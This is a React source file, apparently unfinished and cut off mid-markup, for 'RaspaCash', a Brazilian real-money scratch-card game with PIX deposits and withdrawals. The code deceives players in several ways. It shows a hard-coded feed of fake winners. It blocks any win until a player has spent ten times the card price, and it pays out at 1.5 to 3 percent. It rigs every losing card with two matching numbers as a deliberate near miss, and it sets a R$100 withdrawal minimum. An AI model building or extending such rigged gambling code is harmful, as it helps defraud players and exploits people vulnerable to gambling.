import React, { useState, useRef, useEffect } from 'react';

const SistemaRaspadinha = () => {
  const canvasRef = useRef(null);
  const [selectedPlan, setSelectedPlan] = useState(null);
  const [isScratching, setIsScratching] = useState(false);
  const [isRevealed, setIsRevealed] = useState(false);
  const [prize, setPrize] = useState(0);
  const [balance, setBalance] = useState(0);
  const [scratchedArea, setScratchedArea] = useState(0);
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [showLogin, setShowLogin] = useState(false);
  const [showDeposit, setShowDeposit] = useState(false);
  const [showFeed, setShowFeed] = useState(false);
  const [user, setUser] = useState({ name: '', email: '' });
  const [depositAmount, setDepositAmount] = useState('');
  const [paymentMethod, setPaymentMethod] = useState('pix');
  const [showPromotion, setShowPromotion] = useState(false);
  const [showWithdraw, setShowWithdraw] = useState(false);
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [withdrawData, setWithdrawData] = useState({
    fullName: '',
    pixKey: '',
    pixKeyType: 'cpf'
  });
  
  // Sistema de sequ√™ncia de fidelidade por cartela
  const [loyaltySequences, setLoyaltySequences] = useState({
    1: { spent: 0, games: 0 }, // Plano Cl√°ssico R$ 5
    2: { spent: 0, games: 0 }, // Plano Premium R$ 10  
    3: { spent: 0, games: 0 }  // Plano VIP R$ 20
  });
  const [promoCards, setPromoCards] = useState([]);
  const [scratchCard, setScratchCard] = useState(null);
  const [revealedNumbers, setRevealedNumbers] = useState([]);
  const [cellRevealStatus, setCellRevealStatus] = useState([]);
  
  // Estados para PIX e integra√ß√µes
  const [showPixModal, setShowPixModal] = useState(false);
  const [currentPixPayment, setCurrentPixPayment] = useState(null);
  const [pixCheckInterval, setPixCheckInterval] = useState(null);
  const [isProcessingPayment, setIsProcessingPayment] = useState(false);
  
  // APIs
  const [picPayAPI, setPicPayAPI] = useState(null);
  const [githubAPI, setGithubAPI] = useState(null);

  const plans = [
    {
      id: 1,
      name: "Plano Cl√°ssico",
      cost: 5,
      maxPrize: 500,
      returnRate: 0.03,
      color: "from-green-400 to-green-600",
      image: "k5jKx_PuSlu9D3B5fy__S",
      description: "Divers√£o garantida com pr√™mios de at√© R$ 500!"
    },
    {
      id: 2,
      name: "Plano Premium",
      cost: 10,
      maxPrize: 1000,
      returnRate: 0.02,
      color: "from-purple-400 to-purple-600",
      image: "bXC6a4Ey18td10IKMReUE",
      description: "Experi√™ncia premium com pr√™mios de at√© R$ 1.000!"
    },
    {
      id: 3,
      name: "Plano VIP",
      cost: 20,
      maxPrize: 2000,
      returnRate: 0.015,
      color: "from-red-400 to-red-600",
      image: "PL81tydFO1QpD82xexV25",
      description: "Exclusividade VIP com pr√™mios de at√© R$ 2.000!"
    }
  ];

  // Pacotes promocionais
  const promotionalPacks = [
    {
      id: 'promo-1',
      planId: 1,
      name: "Pacote Cl√°ssico",
      quantity: 5,
      originalPrice: 25,
      promoPrice: 15,
      discount: 40,
      color: "from-green-400 to-green-600",
      image: "FRbl23c868N2puDFaHwJf"
    },
    {
      id: 'promo-2',
      planId: 2,
      name: "Pacote Premium",
      quantity: 5,
      originalPrice: 50,
      promoPrice: 40,
      discount: 20,
      color: "from-purple-400 to-purple-600",
      image: "n8whZEnqinUez0l5jAXIw"
    },
    {
      id: 'promo-3',
      planId: 3,
      name: "Pacote VIP",
      quantity: 5,
      originalPrice: 100,
      promoPrice: 85,
      discount: 15,
      color: "from-red-400 to-red-600",
      image: "HRhqmfvIk4IhQN6HOoh8k"
    }
  ];

  // Feed de ganhos falsos
  const fakeFeed = [
    { name: "Jo√£o S.", amount: 150, plan: "Cl√°ssico", time: "2 min atr√°s" },
    { name: "Maria L.", amount: 890, plan: "Premium", time: "5 min atr√°s" },
    { name: "Carlos P.", amount: 45, plan: "Cl√°ssico", time: "8 min atr√°s" },
    { name: "Ana R.", amount: 1200, plan: "VIP", time: "12 min atr√°s" },
    { name: "Pedro M.", amount: 320, plan: "Premium", time: "15 min atr√°s" },
    { name: "Julia F.", amount: 75, plan: "Cl√°ssico", time: "18 min atr√°s" },
    { name: "Roberto K.", amount: 1890, plan: "VIP", time: "22 min atr√°s" },
    { name: "Fernanda O.", amount: 450, plan: "Premium", time: "25 min atr√°s" }
  ];

  // Calcular b√¥nus de fidelidade para o plano espec√≠fico
  const calculateLoyaltyBonus = (planId) => {
    const sequence = loyaltySequences[planId];
    const plan = plans.find(p => p.id === planId);
    
    if (!sequence || !plan) return 0;
    
    // Meta de gasto para ativar b√¥nus de fidelidade (10x o custo da cartela)
    const spendTarget = plan.cost * 10;
    
    if (sequence.spent >= spendTarget) {
      // Calcular b√¥nus progressivo: 2% a cada 10 jogadas extras ap√≥s atingir a meta
      const extraSpent = sequence.spent - spendTarget;
      const extraCycles = Math.floor(extraSpent / spendTarget);
      const bonusRate = Math.min(extraCycles * 0.02, 0.15); // M√°ximo 15% de b√¥nus
      
      return bonusRate;
    }
    
    return 0;
  };

  // Fun√ß√£o para gerar cartela com n√∫meros aleat√≥rios + sistema de fidelidade
  const generateScratchCard = (plan) => {
    const numbers = [];
    const maxNumber = plan.maxPrize;
    
    // Verificar se atingiu o valor m√≠nimo para poder ganhar
    const sequence = loyaltySequences[plan.id];
    const spendTarget = plan.cost * 10; // Meta m√≠nima para poder ganhar
    const hasReachedMinimum = sequence.spent >= spendTarget;
    
    // Taxa base + b√¥nus de fidelidade
    const loyaltyBonus = calculateLoyaltyBonus(plan.id);
    const finalReturnRate = plan.returnRate + loyaltyBonus;
    
    // Decidir se vai ganhar baseado na taxa de retorno + b√¥nus
    const random = Math.random();
    
    // S√ì PODE GANHAR SE ATINGIU O VALOR M√çNIMO
    if (hasReachedMinimum && random < finalReturnRate) {
      // VAI GANHAR - gerar cartela ganhadora
      let prizeNumber;
      if (random < 0.001) { // 0.1% chance de pr√™mio m√°ximo (extremamente raro)
        prizeNumber = plan.maxPrize;
      } else if (random < 0.003) { // 0.2% chance de pr√™mio grande
        prizeNumber = Math.floor(Math.random() * (plan.maxPrize * 0.2)) + (plan.maxPrize * 0.1);
      } else { // chance de pr√™mio pequeno (mais comum) - menor ainda
        prizeNumber = Math.floor(Math.random() * (plan.cost * 3)) + plan.cost;
      }
      
      // Come√ßar com n√∫meros aleat√≥rios
      for (let i = 0; i < 9; i++) {
        numbers.push(Math.floor(Math.random() * maxNumber) + 1);
      }
      
      // Escolher 3 posi√ß√µes aleat√≥rias para colocar o n√∫mero premiado
      const positions = [];
      while (positions.length < 3) {
        const pos = Math.floor(Math.random() * 9);
        if (!positions.includes(pos)) {
          positions.push(pos);
        }
      }
      
      positions.forEach(pos => {
        numbers[pos] = prizeNumber;
      });
      
      return { 
        numbers, 
        prizeNumber, 
        isWinner: true, 
        loyaltyBonus: loyaltyBonus,
        finalReturnRate: finalReturnRate,
        hasReachedMinimum: hasReachedMinimum
      };
    } else {
      // N√ÉO VAI GANHAR - mas sempre garantir 2 n√∫meros iguais para dar esperan√ßa
      
      // Gerar n√∫meros base aleat√≥rios
      for (let i = 0; i < 9; i++) {
        numbers.push(Math.floor(Math.random() * maxNumber) + 1);
      }
      
      // Escolher um n√∫mero "quase ganhador" (n√£o pode ser muito alto para n√£o frustar)
      const almostWinNumber = Math.floor(Math.random() * (plan.cost * 8)) + plan.cost;
      
      // Escolher 2 posi√ß√µes aleat√≥rias para colocar o n√∫mero "quase ganhador"
      const positions = [];
      while (positions.length < 2) {
        const pos = Math.floor(Math.random() * 9);
        if (!positions.includes(pos)) {
          positions.push(pos);
        }
      }
      
      // Colocar exatamente 2 n√∫meros iguais
      positions.forEach(pos => {
        numbers[pos] = almostWinNumber;
      });
      
      // Garantir que os outros n√∫meros n√£o formem trio
      const numberCounts = {};
      numbers.forEach(num => {
        numberCounts[num] = (numberCounts[num] || 0) + 1;
      });
      
      // Corrigir se algum outro n√∫mero apareceu 3+ vezes
      Object.keys(numberCounts).forEach(num => {
        if (numberCounts[num] >= 3 && parseInt(num) !== almostWinNumber) {
          const indices = numbers.map((n, i) => n == num ? i : -1).filter(i => i !== -1);
          // Substituir os n√∫meros extras para n√£o formar trio
          for (let i = 2; i < indices.length; i++) {
            let newNumber;
            do {
              newNumber = Math.floor(Math.random() * maxNumber) + 1;
            } while (newNumber === almostWinNumber || newNumber === parseInt(num));
            numbers[indices[i]] = newNumber;
          }
        }
      });
      
      return { 
        numbers, 
        prizeNumber: 0, 
        isWinner: false, 
        almostWinNumber,
        loyaltyBonus: loyaltyBonus,
        finalReturnRate: finalReturnRate,
        hasReachedMinimum: hasReachedMinimum
      };
    }
  };

  // Fun√ß√£o para verificar se ganhou
  const checkWin = (numbers) => {
    const counts = {};
    numbers.forEach(num => {
      counts[num] = (counts[num] || 0) + 1;
    });
    
    const winningNumber = Object.keys(counts).find(num => counts[num] >= 3);
    return winningNumber ? parseInt(winningNumber) : 0;
  };

  // Inicializar APIs ao carregar
  useEffect(() => {
    // Carregar scripts das APIs
    const loadScripts = async () => {
      try {
        // Carregar QRCode library
        if (!window.QRCode) {
          const script = document.createElement('script');
          script.src = 'https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js';
          script.onload = () => console.log('QRCode library loaded');
          document.head.appendChild(script);
        }
        
        // Carregar APIs PicPay e GitHub se dispon√≠veis
        if (typeof window !== 'undefined') {
          // Tentar carregar PicPay API
          if (window.createPicPayAPI) {
            const api = window.createPicPayAPI();
            setPicPayAPI(api);
            console.log('‚úÖ PicPay API carregada');
          } else {
            console.warn('‚ö†Ô∏è PicPay API n√£o encontrada');
          }
          
          // Tentar carregar GitHub API
          if (window.createGitHubAPI) {
            const api = window.createGitHubAPI();
            setGithubAPI(api);
            console.log('‚úÖ GitHub API carregada');
          } else {
            console.warn('‚ö†Ô∏è GitHub API n√£o encontrada');
          }
        }
      } catch (error) {
        console.error('Erro ao carregar APIs:', error);
      }
    };
    
    loadScripts();
  }, []);

  // Fun√ß√µes de login e dep√≥sito - SEM LOGIN DE TESTE
  const handleLogin = async (e) => {
    e.preventDefault();
    const formData = new FormData(e.target);
    const userData = {
      name: formData.get('name')?.trim(),
      email: formData.get('email')?.trim()
    };
    
    // Valida√ß√µes
    if (!userData.name || userData.name.length < 2) {
      alert('Por favor, digite seu nome completo (m√≠nimo 2 caracteres)');
      return;
    }
    
    if (!userData.email || !userData.email.includes('@')) {
      alert('Por favor, digite um email v√°lido');
      return;
    }
    
    setUser(userData);
    
    try {
      // Carregar dados do usu√°rio do GitHub
      if (githubAPI) {
        const userDataFromGitHub = await githubAPI.loadUserData(userData.email);
        setBalance(userDataFromGitHub.balance || 0);
        console.log('‚úÖ Dados do usu√°rio carregados do GitHub');
      } else {
        // Fallback para localStorage se GitHub n√£o estiver dispon√≠vel
        const localData = localStorage.getItem(`user_${userData.email}`);
        if (localData) {
          const parsed = JSON.parse(localData);
          setBalance(parsed.balance || 0);
        } else {
          setBalance(0);
        }
        console.warn('‚ö†Ô∏è GitHub API n√£o dispon√≠vel, usando localStorage');
      }
    } catch (error) {
      console.error('Erro ao carregar dados do usu√°rio:', error);
      setBalance(0);
    }
    
    setIsLoggedIn(true);
    setShowLogin(false);
  };

  // Integra√ß√£o real com saque PIX via PicPay
  const handleWithdraw = async (e) => {
    e.preventDefault();
    const amount = parseFloat(withdrawAmount);
    
    if (amount < 100) {
      alert('Saque m√≠nimo de R$ 100,00!');
      return;
    }
    
    if (amount > balance) {
      alert('Saldo insuficiente para saque!');
      return;
    }

    if (!withdrawData.fullName.trim()) {
      alert('Por favor, preencha seu nome completo!');
      return;
    }

    if (!withdrawData.pixKey.trim()) {
      alert('Por favor, preencha sua chave PIX!');
      return;
    }
    
    if (!picPayAPI) {
      alert('Sistema de saque n√£o dispon√≠vel. Tente novamente.');
      return;
    }
    
    try {
      setIsProcessingPayment(true);
      
      // Processar saque via PicPay
      const result = await picPayAPI.processPixPayout(
        amount,
        withdrawData.pixKey,
        withdrawData.pixKeyType,
        withdrawData.fullName,
        user.email
      );
      
      if (result.success) {
        // Deduzir do saldo
        setBalance(prev => prev - amount);
        
        // Registrar no GitHub
        if (githubAPI) {
          await githubAPI.logTransaction({
            type: 'withdrawal',
            amount: amount,
            userId: user.email,
            method: 'picpay_pix',
            pixKey: withdrawData.pixKey,
            status: 'processing'
          });
          
          // Disparar webhook
          await githubAPI.triggerWebhook('pix_payout_requested', {
            user_id: user.email,
            amount: amount,
            pix_key: withdrawData.pixKey,
            pix_key_type: withdrawData.pixKeyType,
            full_name: withdrawData.fullName
          });
        }
        
        setWithdrawAmount('');
        setWithdrawData({ fullName: '', pixKey: '', pixKeyType: 'cpf' });
        setShowWithdraw(false);
        
        alert(`Saque de R$ ${amount.toFixed(2)} solicitado com sucesso! ${result.message}`);
      } else {
        throw new Error('Falha ao processar saque');
      }
      
    } catch (error) {
      console.error('Erro ao processar saque:', error);
      alert('Erro ao processar saque: ' + error.message);
    } finally {
      setIsProcessingPayment(false);
    }
  };



  // Integra√ß√£o real com PicPay PIX
  const handleDeposit = async (e) => {
    e.preventDefault();
    const amount = parseFloat(depositAmount);
    
    if (!amount || amount < 5) {
      alert('Valor m√≠nimo para dep√≥sito: R$ 5,00');
      return;
    }
    
    if (!picPayAPI) {
      alert('Sistema de pagamento n√£o dispon√≠vel. Tente novamente.');
      return;
    }
    
    try {
      setIsProcessingPayment(true);
      
      // Gerar PIX via PicPay
      const pixData = await picPayAPI.generatePixPayment(amount, user.email, user.email);
      
      setCurrentPixPayment(pixData);
      setShowPixModal(true);
      setShowDeposit(false);
      
      // Iniciar verifica√ß√£o de pagamento
      startPaymentCheck(pixData.id);
      
    } catch (error) {
      console.error('Erro ao gerar PIX:', error);
      alert('Erro ao gerar PIX: ' + error.message);
    } finally {
      setIsProcessingPayment(false);
    }
  };

  // Verificar status do pagamento PIX
  const startPaymentCheck = (paymentId) => {
    const interval = setInterval(async () => {
      try {
        if (!picPayAPI) return;
        
        const status = await picPayAPI.checkPaymentStatus(paymentId);
        
        if (status.status === 'paid' || status.status === 'completed') {
          // Pagamento confirmado
          const amount = currentPixPayment.amount;
          setBalance(prev => prev + amount);
          
          // Registrar no GitHub
          if (githubAPI) {
            await githubAPI.logTransaction({
              type: 'deposit',
              amount: amount,
              userId: user.email,
              method: 'picpay_pix',
              status: 'completed'
            });
            
            // Disparar webhook
            await githubAPI.triggerWebhook('pix_payment_confirmed', {
              user_id: user.email,
              amount: amount,
              status: status.status,
              transaction_id: status.authorizationId,
              reference_id: paymentId
            });
          }
          
          clearInterval(interval);
          setPixCheckInterval(null);
          setShowPixModal(false);
          
          alert(`Pagamento confirmado! R$ ${amount.toFixed(2)} foi adicionado ao seu saldo.`);
          
        } else if (status.status === 'expired' || status.status === 'cancelled') {
          clearInterval(interval);
          setPixCheckInterval(null);
          setShowPixModal(false);
          alert('Pagamento expirado ou cancelado.');
        }
        
      } catch (error) {
        console.error('Erro ao verificar pagamento:', error);
      }
    }, 5000); // Verificar a cada 5 segundos
    
    setPixCheckInterval(interval);
    
    // Limpar ap√≥s 30 minutos
    setTimeout(() => {
      if (interval) {
        clearInterval(interval);
        setPixCheckInterval(null);
      }
    }, 30 * 60 * 1000);
  };

  // Refer√™ncia para canvas auxiliar invis√≠vel que sempre mant√©m os n√∫meros
  const backgroundCanvasRef = useRef(null);

  // Sistema de CAMADAS - n√∫meros sempre vis√≠veis por baixo do canvas
  useEffect(() => {
    if (selectedPlan && scratchCard && canvasRef.current) {
      const canvas = canvasRef.current;
      const ctx = canvas.getContext('2d');
      
      // Limpar canvas
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      
      // Canvas TRANSPARENTE inicialmente (n√∫meros ficam vis√≠veis por baixo)
      ctx.fillStyle = 'rgba(0, 0, 0, 0)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      
      // Cobrir tudo com cobertura cinza ap√≥s um delay
      setTimeout(() => {
        // Cobertura opaca por cima dos n√∫meros
        ctx.fillStyle = '#666666';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        
        // Textura da cobertura
        ctx.fillStyle = '#777777';
        for (let i = 0; i < canvas.width; i += 15) {
          for (let j = 0; j < canvas.height; j += 15) {
            if ((i + j) % 30 === 0) {
              ctx.fillRect(i, j, 8, 8);
            }
          }
        }
        
        // Texto da cobertura
        ctx.fillStyle = '#FFFFFF';
        ctx.font = 'bold 16px Arial';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';
        ctx.shadowColor = '#000000';
        ctx.shadowBlur = 3;
        
        ctx.fillText('RASPE PARA REVELAR', canvas.width / 2, canvas.height / 2 - 20);
        ctx.font = 'bold 14px Arial';
        ctx.fillText('3 n√∫meros iguais = GANHOU!', canvas.width / 2, canvas.height / 2);
        ctx.font = 'bold 12px Arial';
        ctx.fillText('(Clique e arraste)', canvas.width / 2, canvas.height / 2 + 20);
        
        ctx.shadowBlur = 0;
      }, 100);
      
      // Reset dos estados
      setScratchedArea(0);
      setIsRevealed(false);
      setRevealedNumbers([]);
      setCellRevealStatus(new Array(9).fill(false));
    }
  }, [selectedPlan, scratchCard]);

  // Fun√ß√£o de raspar com sistema de camadas
  const scratch = (e) => {
    if (!canvasRef.current || !isScratching || !scratchCard) return;
    
    const canvas = canvasRef.current;
    const ctx = canvas.getContext('2d');
    const rect = canvas.getBoundingClientRect();
    
    const x = e.clientX - rect.left;
    const y = e.clientY - rect.top;
    
    // APENAS remover cobertura para revelar n√∫meros que est√£o por baixo
    ctx.globalCompositeOperation = 'destination-out';
    ctx.beginPath();
    ctx.arc(x, y, 25, 0, 2 * Math.PI);
    ctx.fill();
    ctx.globalCompositeOperation = 'source-over';
    
    // Calcular √°rea total raspada (contar pixels transparentes)
    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
    let transparent = 0;
    let totalPixels = 0;
    
    for (let i = 3; i < imageData.data.length; i += 4) {
      totalPixels++;
      if (imageData.data[i] < 100) {
        transparent++;
      }
    }
    
    const scratchPercent = transparent / totalPixels;
    setScratchedArea(scratchPercent);
    
    // Quando raspar 70% ou mais, revelar resultado final (mais responsivo)
    if (scratchPercent >= 0.7 && !isRevealed) {
      setIsRevealed(true);
      
      // Verificar se ganhou com base nos n√∫meros da cartela
      if (scratchCard) {
        const winningAmount = checkWin(scratchCard.numbers);
        setPrize(winningAmount);
      }
    }
  };

  const startGame = async (plan) => {
    if (balance < plan.cost) {
      alert('Saldo insuficiente!');
      return;
    }
    
    // Atualizar sequ√™ncia de fidelidade para este plano espec√≠fico
    setLoyaltySequences(prev => ({
      ...prev,
      [plan.id]: {
        spent: prev[plan.id].spent + plan.cost,
        games: prev[plan.id].games + 1
      }
    }));
    
    setBalance(prev => prev - plan.cost);
    setSelectedPlan(plan);
    const cardData = generateScratchCard(plan);
    setScratchCard(cardData);
    setPrize(cardData.prizeNumber);
    setIsRevealed(false);
    setRevealedNumbers([]);
    setCellRevealStatus(new Array(9).fill(false));
    
    // Registrar jogo no GitHub
    if (githubAPI) {
      try {
        await githubAPI.logGame({
          userId: user.email,
          cost: plan.cost,
          planName: plan.name,
          won: cardData.isWinner,
          prize: cardData.prizeNumber || 0
        });
        
        // Disparar webhook
        await githubAPI.triggerWebhook('game_played', {
          user_id: user.email,
          cost: plan.cost,
          won: cardData.isWinner,
          prize: cardData.prizeNumber || 0
        });
      } catch (error) {
        console.error('Erro ao registrar jogo:', error);
      }
    }
  };

  // Comprar pacote promocional
  const buyPromotionalPack = (pack) => {
    if (balance < pack.promoPrice) {
      alert('Saldo insuficiente!');
      return;
    }

    const originalPlan = plans.find(p => p.id === pack.planId);
    if (!originalPlan) return;

    // Descontar o valor do pacote do saldo
    setBalance(prev => prev - pack.promoPrice);
    
    // Fechar modal de promo√ß√£o
    setShowPromotion(false);
    
    // Criar array com as cartelas do pacote
    const cards = [];
    for (let i = 0; i < pack.quantity; i++) {
      const cardData = generateScratchCard(originalPlan);
      cards.push({
        id: i,
        plan: originalPlan,
        cardData: cardData,
        isUsed: false
      });
    }
    
    // Configurar as cartelas promocionais
    setPromoCards(cards);
    setSelectedPlan({
      ...originalPlan,
      name: `${pack.name} - Promo`,
      isPromo: true,
      originalCost: originalPlan.cost,
      promoCost: pack.promoPrice,
      quantity: pack.quantity,
      remainingGames: pack.quantity,
      currentCard: null // Garantir que inicia na tela de sele√ß√£o
    });
    
    // Resetar estados da raspadinha
    setPrize(0);
    setIsRevealed(false);
  };

  // Selecionar cartela para raspar
  const selectPromoCard = (cardIndex) => {
    const card = promoCards[cardIndex];
    if (card && !card.isUsed) {
      setSelectedPlan(prev => ({
        ...prev,
        currentCard: cardIndex
        // N√£o diminuir remainingGames aqui, apenas quando finalizar a cartela
      }));
      setScratchCard(card.cardData);
      setPrize(card.cardData.prizeNumber);
      setIsRevealed(false);
      setRevealedNumbers([]);
    }
  };

  // Finalizar cartela atual e voltar para sele√ß√£o
  const finishCurrentCard = () => {
    // Marcar cartela como usada
    setPromoCards(prev => 
      prev.map((card, index) => 
        index === selectedPlan.currentCard 
          ? { ...card, isUsed: true }
          : card
      )
    );

    // Diminuir o n√∫mero de cartelas restantes
    const newRemainingGames = selectedPlan.remainingGames - 1;
    
    // Se ainda h√° cartelas, voltar para sele√ß√£o
    if (newRemainingGames > 0) {
      setSelectedPlan(prev => ({ 
        ...prev, 
        currentCard: null,
        remainingGames: newRemainingGames
      }));
      setPrize(0);
      setIsRevealed(false);
      setScratchCard(null);
      setRevealedNumbers([]);
      setCellRevealStatus([]);
      setCellRevealStatus([]);
      setCellRevealStatus([]);
    } else {
      // Acabaram as cartelas, voltar ao menu
      setSelectedPlan(null);
      setPromoCards([]);
      setPrize(0);
      setIsRevealed(false);
      setScratchCard(null);
      setRevealedNumbers([]);
    }
  };

  const collectPrize = async () => {
    setBalance(prev => prev + prize);
    
    // Registrar pr√™mio no GitHub e localStorage
    if (prize > 0) {
      const transactionData = {
        type: 'prize',
        amount: prize,
        userId: user.email,
        method: 'scratch_card',
        status: 'completed',
        timestamp: new Date().toISOString()
      };
      
      // Tentar salvar no GitHub
      if (githubAPI) {
        try {
          await githubAPI.logTransaction(transactionData);
        } catch (error) {
          console.error('Erro ao registrar pr√™mio no GitHub:', error);
        }
      }
      
      // Sempre salvar no localStorage como backup
      try {
        const userKey = `user_${user.email}`;
        const userData = JSON.parse(localStorage.getItem(userKey) || '{}');
        userData.balance = balance + prize;
        userData.lastUpdated = new Date().toISOString();
        localStorage.setItem(userKey, JSON.stringify(userData));
      } catch (error) {
        console.error('Erro ao salvar no localStorage:', error);
      }
    }
    
    // Se √© um pacote promocional, continuar com as outras cartelas
    if (selectedPlan?.isPromo && promoCards.length > 0) {
      finishCurrentCard();
    } else {
      // Jogo individual normal
      setSelectedPlan(null);
      setPrize(0);
      setIsRevealed(false);
      setScratchCard(null);
      setRevealedNumbers([]);
    }
  };

  // Modal PIX para pagamento
  if (showPixModal && currentPixPayment) {
    return (
      <div className="w-full h-full bg-gradient-to-br from-blue-600 via-indigo-600 to-purple-600 p-4 text-white flex items-center justify-center relative overflow-hidden">
        {/* Efeitos de fundo */}
        <div className="absolute inset-0 opacity-30">
          <div className="absolute top-20 left-20 w-40 h-40 bg-green-400 rounded-full blur-2xl animate-pulse"></div>
          <div className="absolute bottom-20 right-20 w-32 h-32 bg-blue-400 rounded-full blur-2xl animate-bounce"></div>
        </div>
        
        <div className="bg-white rounded-2xl p-8 max-w-md w-full mx-4 text-gray-800 relative z-10 shadow-2xl">
          <div className="text-center mb-6">
            <div className="w-16 h-16 bg-gradient-to-r from-green-500 to-emerald-600 rounded-full mx-auto mb-4 flex items-center justify-center">
              <span className="text-3xl">üì±</span>
            </div>
            <h3 className="text-2xl font-bold text-gray-800 mb-2">Pagamento PIX</h3>
            <p className="text-gray-600">Escaneie o QR Code ou use o c√≥digo PIX</p>
          </div>
          
          <div className="text-center mb-6">
            <div id="qrCodeContainer" className="bg-gray-100 p-4 rounded-lg mb-4 flex justify-center">
              <canvas id="qrCanvas" className="max-w-full"></canvas>
            </div>
            <div className="text-2xl font-bold text-green-600 mb-2">
              R$ {currentPixPayment.amount.toFixed(2).replace('.', ',')}
            </div>
            <div className="text-sm text-gray-500 flex items-center justify-center">
              <div className="w-2 h-2 bg-orange-500 rounded-full animate-pulse mr-2"></div>
              Aguardando pagamento...
            </div>
          </div>
          
          <div className="space-y-3">
            <button 
              onClick={() => {
                if (currentPixPayment?.qr_code) {
                  navigator.clipboard.writeText(currentPixPayment.qr_code);
                  alert('C√≥digo PIX copiado!');
                }
              }}
              className="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 rounded-lg transition-all"
            >
              üìã Copiar C√≥digo PIX
            </button>
            <button 
              onClick={() => {
                setShowPixModal(false);
                if (pixCheckInterval) {
                  clearInterval(pixCheckInterval);
                  setPixCheckInterval(null);
                }
              }}
              className="w-full bg-gray-500 hover:bg-gray-600 text-white font-bold py-3 rounded-lg transition-all"
            >
              Cancelar
            </button>
          </div>
          
          <div className="mt-4 text-center text-xs text-gray-400">
            <p>‚è∞ Este PIX expira em 30 minutos</p>
            <p>üí° O pagamento ser√° confirmado automaticamente</p>
          </div>
        </div>
      </div>
    );
  }

  // Gerar QR Code quando o modal PIX √© mostrado
  useEffect(() => {
    if (showPixModal && currentPixPayment && currentPixPayment.qr_code) {
      const canvas = document.getElementById('qrCanvas');
      if (canvas && window.QRCode) {
        window.QRCode.toCanvas(canvas, currentPixPayment.qr_code, { 
          width: 200,
          margin: 2,
          color: {
            dark: '#000000',
            light: '#FFFFFF'
          }
        }, function (error) {
          if (error) console.error('Erro ao gerar QR Code:', error);
        });
      }
    }
  }, [showPixModal, currentPixPayment]);

  // Tela de login
  if (!isLoggedIn) {
    return (
      <div className="w-full h-full bg-gradient-to-br from-pink-500 via-red-500 to-yellow-500 p-8 text-white flex items-center justify-center relative overflow-hidden">
        {/* Efeitos de fundo animados */}
        <div className="absolute inset-0 opacity-20">
          <div className="absolute top-10 left-10 w-32 h-32 bg-yellow-400 rounded-full blur-xl animate-pulse"></div>
          <div className="absolute top-40 right-20 w-24 h-24 bg-pink-400 rounded-full blur-xl animate-bounce"></div>
          <div className="absolute bottom-20 left-1/3 w-40 h-40 bg-purple-400 rounded-full blur-xl animate-pulse"></div>
          <div className="absolute bottom-10 right-10 w-28 h-28 bg-green-400 rounded-full blur-xl animate-bounce"></div>
        </div>
        <div className="bg-gradient-to-br from-purple-800/80 to-blue-800/80 backdrop-blur-lg rounded-2xl p-8 max-w-md w-full border border-yellow-400/30 shadow-2xl relative z-10">
          <div className="text-center mb-8">
            <h1 className="text-4xl font-bold mb-2 bg-gradient-to-r from-yellow-400 via-pink-400 to-purple-400 bg-clip-text text-transparent">
              üé∞ RaspaCash üé∞
            </h1>
            <p className="text-lg text-yellow-200">Fa√ßa login para come√ßar a ganhar!</p>
            <div className="flex justify-center space-x-2 mt-2">
              <span className="text-2xl animate-bounce">üí∞</span>
              <span className="text-2xl animate-pulse">üéâ</span>
              <span className="text-2xl animate-bounce">üíé</span>
            </div>
          </div>
          
          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <label className="block text-sm font-bold mb-2">Nome Completo</label>
              <input
                name="name"
                type="text"
                required
                className="w-full p-3 rounded-lg bg-white/20 border border-white/30 text-white placeholder-white/50"
                placeholder="Seu nome completo"
              />
            </div>
            <div>
              <label className="block text-sm font-bold mb-2">Email</label>
              <input
                name="email"
                type="email"
                required
                className="w-full p-3 rounded-lg bg-white/20 border border-white/30 text-white placeholder-white/50"
                placeholder="seu@email.com"
              />
            </div>
            <button
              type="submit"
              className="w-full bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 py-4 rounded-xl font-bold transition-all transform active:scale-95 shadow-lg text-lg border-2 border-green-300"
            >
              ‚ú® Entrar na Plataforma ‚ú®
            </button>
          </form>

          <div className="mt-4">
            <div className="text-center text-sm mb-3 opacity-75">
              <p>‚Äî OU ‚Äî</p>
            </div>

          </div>
          
          <div className="mt-6 text-center text-sm opacity-75">
            <p>Ao fazer login, voc√™ concorda com nossos termos de uso</p>
          </div>
        </div>
      </div>
    );
  }

  // Modal de saque
  if (showWithdraw) {
    return (
      <div className="w-full h-full bg-gradient-to-br from-purple-600 via-pink-600 to-red-600 p-4 text-white overflow-y-scroll relative" style={{ overscrollBehavior: 'contain' }}>
        {/* Efeitos de fundo */}
        <div className="absolute inset-0 opacity-30">
          <div className="absolute top-20 left-20 w-40 h-40 bg-yellow-400 rounded-full blur-2xl animate-pulse"></div>
          <div className="absolute bottom-20 right-20 w-32 h-32 bg-green-400 rounded-full blur-2xl animate-bounce"></div>
        </div>
        <div className="bg-gradient-to-br from-gray-900/90 to-purple-900/90 backdrop-blur-lg rounded-2xl p-4 sm:p-8 max-w-md w-full mx-auto my-4 border border-purple-400/50 shadow-2xl relative z-10">
          <div className="text-center mb-4 sm:mb-6">
            <h2 className="text-2xl sm:text-3xl font-bold mb-2 bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">
              üí∏ Solicitar Saque üí∏
            </h2>
            <p className="text-base sm:text-lg text-yellow-300">Saque via PIX - R√°pido e Seguro</p>
            <div className="flex justify-center space-x-2 mt-2">
              <span className="text-lg sm:text-xl animate-bounce">üí∞</span>
              <span className="text-lg sm:text-xl animate-pulse">üì±</span>
              <span className="text-lg sm:text-xl animate-bounce">‚ö°</span>
            </div>
          </div>

          {/* Aviso de saque m√≠nimo */}
          <div className="bg-yellow-500/20 border border-yellow-400/50 rounded-lg p-4 mb-4">
            <div className="text-center">
              <div className="text-lg font-bold text-yellow-300 mb-1">
                ‚ö†Ô∏è SAQUE M√çNIMO ‚ö†Ô∏è
              </div>
              <div className="text-base text-yellow-200">
                R$ 100,00
              </div>
              <div className="text-sm text-yellow-300 mt-1">
                Processamento em at√© 24 horas
              </div>
